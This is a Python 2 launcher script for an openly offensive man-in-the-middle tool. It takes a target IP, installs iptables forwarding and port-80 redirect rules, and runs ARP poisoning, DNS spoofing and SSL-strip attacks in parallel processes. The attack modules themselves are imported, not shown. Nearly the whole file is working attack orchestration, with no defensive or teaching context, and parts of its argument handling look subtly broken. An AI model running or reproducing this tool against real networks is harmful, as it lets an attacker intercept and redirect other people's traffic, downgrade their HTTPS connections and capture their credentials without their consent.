import getopt
import multiprocessing
import os
import sys
import time

from scapy.arch import get_if_addr
from scapy.config import conf

from arpPoison import ArpPoison
from dnsSpoof import DnsSpoof
from sslStrip import SSLStrip


def stop_process(process):
    process.join(5)
    name = process.name

    if process.is_alive():
        process.terminate()
        print "[*] Terminated " + name + " Process"

    if not process.is_alive():
        print "[*] " + name + " exited successfully"
    else:
        print "[*] " + name + " failed to exit: use CTRL-Z to kill"


def help():
    print 'Arp Poison + DNS spoof + SSL Strip. Usage:'
    print ''
    print 'main.py -t <target ip>'
    print ''
    print 'Arguments:'
    print "-t <target ip>, --target=<target ip>             Specify target ip"
    print ''
    print 'Optional arguments:'
    print "-g <gateway ip>  , --gateway=<gateway ip>        Specify gateway ip, default gateway used otherwise"
    print "-i <interface> , --interface=<interface>         Specify interface, default interface used otherwise"
    print "-d <map url->ip> , --dns=<map url->ip>           Start dns spoof attack on specified url(s)"
    print "-a <redirect ip> , --dnsall=<redirect ip>        Start dns spoof attack on all dns responses"
    print "-s , --ssl                                       Start ssl strip attack"
    print "-q <queue number> , --queuenum=<queue number>    Queue number for netfilterqueue used for dns attack, " \
          "default is 0"
    print "-h , --help                                      Print this help message."


def main(argv):
    target = ""
    gateway = conf.route.route("0.0.0.0")[2]
    interface = conf.iface
    do_dns_attack = False
    do_ssl_strip = False
    queue_num = 0
    super_dns_attack = False
    dns_dic = ''

    try:
        # process arguments
        try:
            opts, args = getopt.getopt(argv, "ht:g:i:d:a:sq:", ["help", "target=", "gateway=", "interface=", "dns=",
                                                              "dnsall=", "ssl", "queuenum="])
        except getopt.GetoptError:
            help()
            sys.exit(2)
        for opt, arg in opts:
            if opt in ("-h", "--help"):
                help()
                sys.exit()
            elif opt in ("-t", "--target"):
                target = arg
            elif opt in ("-g", "--gateway"):
                gateway = arg
            elif opt in ("-i", "--interface"):
                interface = arg
            elif opt in ("-d", "--dns"):
                do_dns_attack = True
                dns_dic = dict(arg)
            elif opt in ("-a", "--dnsall"):
                do_dns_attack = True
                super_dns_attack = True
                if arg is "":
                    dns_dic = str(get_if_addr(interface))
                else:
                    dns_dic = str(arg)
            elif opt in ("-s", "--ssl"):
                do_ssl_strip = True
                if do_dns_attack:
                    print 'DNS and SSL attacks are both selected. At the moment these do not work together. ' \
                          'DNS spoofing will be turned off'
                    do_dns_attack = False
            elif opt in ("-q", "--queuenum"):
                queue_num = arg

        if target is '':
            print "No Target Specified"
            print ''
            help()
            sys.exit()

        # iptable rules
        os.system('iptables -P FORWARD DROP')

        if do_dns_attack:
            os.system('iptables -I FORWARD -i ' + interface + ' -j NFQUEUE --queue-num ' + str(queue_num))

        if do_ssl_strip:
            os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")

        os.system('iptables -A FORWARD -i ' + interface + ' -j ACCEPT')

        # --- ARP ---
        arp = ArpPoison(target, gateway, interface)

        # Start ARP process
        arp_process = multiprocessing.Process(target=arp.start, name="ARP Poison")
        arp_process.start()
        print "[*] Started ARP Process"

        # --- DNS ---
        if do_dns_attack:
            dns = DnsSpoof(interface, super_dns_attack, dns_dic)

            # Start DNS process
            dns_process = multiprocessing.Process(target=dns.start, args=[queue_num],
                                                  name="DNS Spoof")
            dns_process.start()
            print "[*] Started DNS Process"

        # --- SSL ---
        if do_ssl_strip:
            ssl = SSLStrip()

            # Start SSL process
            ssl_process = multiprocessing.Process(target=ssl.start, name="SSL Strip")
            ssl_process.start()
            print "[*] Started SSL Process"

        time.sleep(1000000000000)

    except KeyboardInterrupt:
        # --- Stopping Attacks ---
        # Stop arp
        stop_process(arp_process)

        # Stop Dns
        if do_dns_attack:
            stop_process(dns_process)

        if do_ssl_strip:
            stop_process(ssl_process)

        # Remove iptable rules
        if do_dns_attack:
            os.system('iptables -D FORWARD -i ' + interface + ' -j NFQUEUE --queue-num ' + str(queue_num))

        if do_ssl_strip:
            os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")

        os.system('iptables -D FORWARD -i ' + interface + ' -j ACCEPT')
        print "[*] Removed iptable rules"

        # exit
        sys.exit(0)


if __name__ == '__main__':
    main(sys.argv[1:])
